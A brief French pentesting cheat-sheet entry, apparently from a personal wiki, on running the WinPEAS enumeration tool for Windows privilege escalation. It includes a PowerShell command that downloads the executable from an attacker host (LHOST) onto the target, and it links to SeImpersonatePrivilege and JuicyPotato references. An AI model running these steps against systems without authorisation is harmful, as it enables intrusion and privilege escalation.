<sub>[Procédure serveur](server_procedure.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Cryptage](cryptage.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Outils](tools.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Sites utiles](useful_website.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Lexique](lexique.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Index](index.md)</sub>
<sub>[Retour](windows.md)</sub>
#WinPeas

**Présentation :**  .exe à éxecuter pour privilege escalation sur windows

**Procédure :**
- Télécharger winPeas : *powershell wget http://**LHOST**/winPEASx64.exe -outfile winPEASx64.exe*
- Exécuter : *./winPEAS.exe*
- si WINPEAS renvoie **SeImpersonatePrivilege** en rouge :
  - FAILLE SeImpersonatePrivilege :
    -  https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege
    -  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato

